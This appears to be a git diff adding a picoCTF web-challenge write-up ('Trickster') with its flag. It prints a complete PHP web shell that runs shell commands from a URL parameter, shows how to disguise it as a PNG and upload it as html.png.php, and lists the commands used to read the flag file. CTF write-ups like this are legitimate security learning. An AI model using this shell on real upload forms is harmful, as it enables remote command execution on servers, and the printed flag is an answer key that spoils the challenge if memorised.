@@ -134,6 +134,51 @@ No learnings.
 References:
 cyber chef
 
-# dont you love banners(general skills)
+# Trickster(web exp)
+## Flag
+picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}
+
+Step 1:
+Was given a website, on which visiting I saw that the website takes png files as uploads.
+In the website I started to upload a random png file and uploaded it and saw that it did nothing only that it accepted if the file type was png otherwise it gave an error.
+Step 2:
+Now thanks to advent of cyber, I knew that when there were file uploads, a php webshell could be created to make an executable web shell on the website which can be used to access files uploaded on the website.
+So I searched on google how to make an executable webshell which I saved. The code was as follows:
+~~~
+PNG
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+~~~
+The png at the start has been added to disguise the webshell as png file.
+I renamed the file and saved it as html.png.php
+Step 3:
+I uploaded the file and visited the /uploads URL which gave me this:
+![image](https://github.com/user-attachments/assets/2e7fcd01-6a27-450d-a82a-11d6f529c83d)
+
+Once here, I decided to execute ls -al /var/www/html to find all the files in that directory.
+
+![image](https://github.com/user-attachments/assets/8f3170b1-6895-4769-969e-b3eae236e983)
+
+Then I decided to cat the GAZWIMLEGU2DQ.txt file and it gave me the flag.
+
+![image](https://github.com/user-attachments/assets/60d843ae-73c7-4c07-ac12-87a04bc20d4b)
+
+
+
+
 
 
